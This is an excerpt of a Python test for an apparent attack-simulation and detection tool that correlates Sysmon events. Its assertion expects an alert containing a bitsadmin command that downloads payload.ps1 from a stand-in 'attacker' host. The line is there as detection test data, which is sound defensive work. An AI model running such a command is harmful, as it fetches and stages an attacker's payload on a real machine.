...
from attack_simulator.cli import correlate_and_fallback_events
...
def test_background_noise_filtering_and_fallback():
    ...
    raw_events = [
        ...
        },
        {
            "EventID": 99,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "TimeCreated": "2026-06-13T12:02:00.000Z"
        }
    ]
    ...
    assert alert_payload["data"]["command"] == "bitsadmin.exe /transfer myjob http://attacker/payload.ps1 C:\\temp\\payload.ps1"
